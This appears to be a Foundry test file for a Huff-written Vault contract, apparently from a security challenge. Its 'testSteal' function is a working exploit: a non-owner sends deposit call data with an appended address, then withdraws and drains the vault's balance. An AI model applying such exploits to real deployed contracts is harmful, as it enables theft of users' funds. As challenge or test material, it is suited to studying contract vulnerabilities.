// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.15;

import "foundry-huff/HuffDeployer.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

contract VaultTest is Test {
    IVault public vault;

    /// @dev Setup the testing environment.
    function setUp() public {
        deal(address(this), 1e18);
        vault = IVault(
            HuffDeployer.config().with_value(1e18).deploy{value: 1e18}("Vault")
        );
    }

    function testSteal() public {
        // non-owner will now steal it
        address hacker = payable(address(1));
        deal(hacker, 1);
        uint256 vaultBalance = address(vault).balance;
        vm.startPrank(hacker);
        bytes memory data = abi.encodeWithSelector(bytes4(0xd0e30db0), hacker);
        (bool success, ) = address(vault).call{value: 1}(data);
        require(success);
        vault.withdraw();
        assertEq(vaultBalance, hacker.balance - 1);
    }
}

interface IVault {
    function owner() external returns (address);

    function setOwner(address) external returns (bool);

    function deposit() payable external;

    function withdraw() external;
}
